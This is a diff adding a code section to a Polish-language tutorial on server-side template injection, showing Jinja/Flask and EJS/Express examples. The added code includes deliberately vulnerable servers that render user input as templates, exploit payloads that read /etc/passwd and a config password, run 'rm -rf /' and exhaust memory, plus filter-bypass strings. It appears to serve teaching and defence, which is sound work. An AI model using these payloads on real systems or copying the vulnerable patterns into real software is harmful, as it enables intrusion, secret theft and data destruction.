@@ -56,10 +56,6 @@
    - **Odpowiedzialne podejście do danych wejściowych**: Implementacja zasad takich jak walidacja, escaping czy stosowanie bezpiecznych bibliotek to fundament budowania odpornych na ataki aplikacji.
    - **Ulepszanie standardów**: Dbałość o dokumentację oraz dzielenie się wiedzą na temat podatności i ich zapobiegania w zespołach programistycznych może przyczynić się do tworzenia bezpieczniejszych aplikacji.
 
-
-
-
-
 ## Pytania
 
 1. Który z poniższych sposobów działania aplikacji przedstawia podatność SSTI?
@@ -83,9 +79,166 @@
    - Modyfikacja stylów CSS aplikacji
    - Przesyłanie dużych plików do bazy danych
 
+## Fragmenty kodu
 
+### Jinja
 
+#### Szablon
 
+```html
+<h1>Hello, {{ name }}!</h1>
+  {% for item in items %}
+  <li>{{ item }}</li>
+  {% endfor %}
+</ul>
+```
 
+#### Serwer
 
-   
+```py
+from flask import Flask, render_template
+
+app = Flask(__name__)
+
+@app.route("/")
+def home():
+    data = {
+        "name": "Bob",
+        "items": ["Pepper", "Turmeric", "Ginger", "<script>alert(1);</script>"],
+    }
+    return render_template("index.html", **data)
+
+if __name__ == "__main__":
+    app.run(port=3000)
+```
+
+#### Wynik
+
+```html
+<h1>Hello, Bob!</h1>
+<ul>
+  <li>Pepper</li>
+  <li>Turmeric</li>
+  <li>Ginger</li>
+  <li>&lt;script&gt;alert(1);&lt;/script&gt;</li>
+</ul>
+```
+
+#### SSTI
+
+##### Serwer
+
+```py
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route("/ssti", methods=["GET"])
+def ssti():
+    template = request.args.get("template", "")
+    return render_template_string(template)
+
+if __name__ == "__main__":
+    app.run(port=3000)
+```
+
+##### Wykorzystanie
+
+```py
+{{ "".join("A" * 10**9) }}
+{{ config["DATABASE_PASSWORD"] }}
+{{ request.__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read() }}
+```
+
+##### Słaba sanityzacja
+
+```py
+template = template.replace("__", "")
+template = template.replace("[", "").replace("]", "")
+```
+
+##### Omijanie filtrów
+
+```py
+{{ request["\x5f\x5fclass\x5f\x5f"] }}
+{{ request|attr("__class__") }}
+{{ "<script>alert(1);</script>"|safe }}
+```
+
+### EJS
+
+#### Szablon
+
+```html
+<h1>Hello, <%= name %>!</h1>
+<ul>
+  <% items.forEach(item => { %>
+  <li><%= item %></li>
+  <% }); %>
+</ul>
+```
+
+#### Serwer
+
+```js
+import express from "express";
+
+const app = express();
+
+app.set("view engine", "ejs");
+
+app.get("/", (_, res) => {
+  const data = {
+    name: "Alice",
+    items: ["Apples", "Bananas", "Cherries", "console.log(process.pid);"],
+  };
+  res.render("index", data);
+});
+
+app.listen(3000);
+```
+
+#### Wynik
+
+```html
+<h1>Hello, Alice!</h1>
+<ul>
+  <li>Apples</li>
+  <li>Bananas</li>
+  <li>Cherries</li>
+  <li>console.log(process.pid);</li>
+</ul>
+```
+
+#### SSTI
+
+##### Serwer
+
+```js
+import { exec } from "node:child_process";
+import express from "express";
+import ejs from "ejs";
+
+const app = express();
+
+const execute = (command) => {
+  exec(command);
+};
+
+const allocate = (size) => {
+  Buffer.alloc(size, "A");
+};
+
+app.get("/", (req, res) => {
+  res.send(ejs.render(req.query.template ?? "", { execute, allocate }));
+});
+
+app.listen(3000);
+```
+
+##### Wykorzystanie
+
+```js
+<%= execute("rm -rf /") %>
+<%= allocate(10 ** 9) %>
+```
